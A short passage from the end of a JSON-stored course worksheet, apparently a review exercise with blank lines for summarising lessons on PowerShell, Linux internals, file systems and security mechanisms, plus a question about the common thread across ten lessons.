+ PowerShell =**\n___________________________________________\n\n**Linux Internals + Processes + File Systems + Security Mechanisms =**\n___________________________________________\n\n**What's the common thread across all 10 lessons?**\n___________________________________________"
      }
    }
  ]
}